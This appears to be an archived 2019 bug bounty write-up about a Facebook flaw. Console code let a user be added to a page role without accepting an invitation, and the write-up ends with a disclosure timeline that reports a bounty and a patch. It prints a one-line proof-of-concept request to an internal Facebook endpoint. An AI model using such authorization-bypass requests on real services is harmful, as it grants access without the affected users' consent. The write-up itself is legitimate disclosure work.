---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-09-12_add-users-to-roles-on-facebook-pages-without-an-invitation-consent.md
original_filename: 2019-09-12_add-users-to-roles-on-facebook-pages-without-an-invitation-consent.md
title: Add users to roles on Facebook pages without an invitation consent
category: documents
detected_topics:
- access-control
- command-injection
- otp
tags:
- imported
- documents
- access-control
- command-injection
- otp
language: en
raw_sha256: e204c74551b7533bae4082a6b6e09f32fec3be7b5b70900d22f44ee5b31106df
text_sha256: 13b661c08964b29e16221e3e5eb779a1bc98fc406281a3ca7a57a1b55b2aeecd
ingested_at: '2026-06-28T07:32:00Z'
sensitivity: unknown
redactions_applied: false
---

# Add users to roles on Facebook pages without an invitation consent

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-09-12_add-users-to-roles-on-facebook-pages-without-an-invitation-consent.md
- Source Type: markdown
- Detected Topics: access-control, command-injection, otp
- Ingested At: 2026-06-28T07:32:00Z
- Redactions Applied: False
- Raw SHA256: `e204c74551b7533bae4082a6b6e09f32fec3be7b5b70900d22f44ee5b31106df`
- Text SHA256: `13b661c08964b29e16221e3e5eb779a1bc98fc406281a3ca7a57a1b55b2aeecd`


## Content

---
title: "Add users to roles on Facebook pages without an invitation consent"
page_title: "Add users to roles on Facebook pages without an invitation consent - These aren't the access_tokens you're looking for"
url: "https://philippeharewood.com/add-users-to-roles-on-facebook-pages-without-an-invitation-consent/"
final_url: "https://philippeharewood.com/add-users-to-roles-on-facebook-pages-without-an-invitation-consent/"
authors: ["Philippe Harewood (@phwd)"]
programs: ["Meta / Facebook"]
bugs: ["Broken authorization"]
publication_date: "2019-09-12"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5036
---

Posted on [September 12, 2019](https://philippeharewood.com/add-users-to-roles-on-facebook-pages-without-an-invitation-consent/)

# Add users to roles on Facebook pages without an invitation consent

Normally for Facebook page role invites, the receiving user must accept the invite before being granted a role on the page. It is possible to skip this consent step and add users to pages.

In a Facebook.com window send the following in the console section.
  
  
  new AsyncRequest('/media/manager/page_task_permissions/').setData({action_type:'ADD_PERSON',page_id:page,user_id:user,tasks:['task']}).send()

This will add user B under the role specified by the task without explicit consent from user B.

Timeline

Sep 12, 2019 – Report sent  
Sep 12, 2019 – Confirmation of submission by Facebook  
Sep 21, 2019 – Bounty awarded by Facebook  
Oct 8, 2019 – Confirmation of patch by Facebook
